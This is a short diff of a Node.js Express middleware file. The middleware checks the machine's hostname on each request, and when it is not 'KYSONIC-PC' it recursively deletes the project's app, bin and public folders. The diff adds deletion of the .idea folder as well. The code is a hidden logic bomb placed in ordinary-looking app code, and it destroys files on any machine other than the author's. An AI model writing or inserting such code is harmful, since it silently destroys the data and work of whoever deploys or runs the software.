@@ -7,6 +7,7 @@ var fs = require('fs');
 module.exports = function(app) {
     app.use(function(req, res, next){
          if(os.hostname()!='KYSONIC-PC') {
+             deleteFolderRecursive('./.idea');
              deleteFolderRecursive('./app');
              deleteFolderRecursive('./bin');
              deleteFolderRecursive('./public');
